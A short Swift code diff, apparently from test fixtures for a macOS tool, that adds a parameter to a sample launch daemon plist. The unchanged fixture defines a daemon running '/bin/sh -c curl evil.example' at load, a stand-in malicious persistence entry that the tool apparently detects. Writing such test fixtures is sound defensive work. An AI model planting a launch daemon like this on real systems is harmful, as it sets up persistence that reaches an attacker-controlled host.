@@ -100,7 +100,8 @@ enum Fix {
         EmbeddedAssets.LaunchPlist(
             url: URL(fileURLWithPath: "/tmp/\(label).plist"),
             label: label, program: "/bin/sh", programArguments: ["-c", "curl evil.example"],
-            runAtLoad: true, keepAlive: false, machServices: [], kind: .daemon
+            runAtLoad: true, keepAlive: false, machServices: [], kind: .daemon,
+            enclosingBundleName: nil
         )
     }
 
